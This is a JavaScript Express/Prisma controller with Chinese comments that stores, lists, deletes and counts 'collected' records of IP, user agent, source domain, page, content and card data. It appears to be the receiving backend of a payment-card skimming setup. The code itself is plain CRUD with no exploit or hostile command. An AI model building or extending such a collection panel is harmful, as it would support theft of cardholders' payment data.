const { PrismaClient } = require('@prisma/client');
const { logAction } = require('../utils/logger');

const prisma = new PrismaClient();

/**
 * 获取所有数据
 */
const getAllData = async (req, res) => {
  try {
    const { page = 1, limit = 20, domain, ip } = req.query;
    const skip = (page - 1) * limit;

    // 构建查询条件
    const where = {};
    if (domain) where.domain = { contains: domain };
    if (ip) where.ip = { contains: ip };

    // 查询数据
    const data = await prisma.data.findMany({
      where,
      orderBy: {
        createdAt: 'desc',
      },
      skip: parseInt(skip),
      take: parseInt(limit),
    });

    // 获取总数
    const total = await prisma.data.count({ where });

    return res.status(200).json({
      status: 'success',
      results: data.length,
      total,
      page: parseInt(page),
      limit: parseInt(limit),
      data,
    });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

/**
 * 获取单条数据
 */
const getData = async (req, res) => {
  try {
    const { id } = req.params;

    const data = await prisma.data.findUnique({
      where: { id: Number(id) },
    });

    if (!data) {
      return res.status(404).json({ message: '数据不存在' });
    }

    return res.status(200).json({
      status: 'success',
      data,
    });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

/**
 * 创建数据
 */
const createData = async (req, res) => {
  try {
    const { ip, ua, domain, page, content, cardData, offline } = req.body;

    const data = await prisma.data.create({
      data: {
        ip,
        ua,
        domain,
        page,
        content,
        cardData,
        offline,
      },
    });

    // 记录日志
    await logAction(req, '数据收集', '新数据创建', `来源: ${domain}${page}`);

    return res.status(201).json({
      status: 'success',
      data,
    });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

/**
 * 更新数据
 */
const updateData = async (req, res) => {
  try {
    const { id } = req.params;
    const { ip, ua, domain, page, content, cardData, offline } = req.body;

    const existingData = await prisma.data.findUnique({
      where: { id: Number(id) },
    });

    if (!existingData) {
      return res.status(404).json({ message: '数据不存在' });
    }

    const data = await prisma.data.update({
      where: { id: Number(id) },
      data: {
        ip,
        ua,
        domain,
        page,
        content,
        cardData,
        offline,
      },
    });

    // 记录日志
    await logAction(req, '数据更新', '数据更新', `ID: ${id}`);

    return res.status(200).json({
      status: 'success',
      data,
    });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

/**
 * 删除数据
 */
const deleteData = async (req, res) => {
  try {
    const { id } = req.params;

    const existingData = await prisma.data.findUnique({
      where: { id: Number(id) },
    });

    if (!existingData) {
      return res.status(404).json({ message: '数据不存在' });
    }

    await prisma.data.delete({
      where: { id: Number(id) },
    });

    // 记录日志
    await logAction(req, '数据删除', '数据删除', `ID: ${id}`);

    return res.status(204).send();
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

/**
 * 批量删除数据
 */
const batchDeleteData = async (req, res) => {
  try {
    const { ids } = req.body;

    if (!ids || !Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ message: '无效的参数' });
    }

    await prisma.data.deleteMany({
      where: {
        id: {
          in: ids.map(id => Number(id)),
        },
      },
    });

    // 记录日志
    await logAction(req, '数据批量删除', '数据批量删除', `删除了 ${ids.length} 条数据`);

    return res.status(200).json({
      status: 'success',
      message: `成功删除 ${ids.length} 条数据`,
    });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

/**
 * 获取数据统计
 */
const getDataStats = async (req, res) => {
  try {
    // 总数据量
    const total = await prisma.data.count();

    // 今日数据量
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayCount = await prisma.data.count({
      where: {
        createdAt: {
          gte: today,
        },
      },
    });

    // 域名统计
    const domains = await prisma.data.groupBy({
      by: ['domain'],
      _count: {
        domain: true,
      },
    });

    return res.status(200).json({
      status: 'success',
      data: {
        total,
        today: todayCount,
        domains: domains.map(d => ({
          domain: d.domain,
          count: d._count.domain,
        })),
      },
    });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

module.exports = {
  getAllData,
  getData,
  createData,
  updateData,
  deleteData,
  batchDeleteData,
  getDataStats,
};
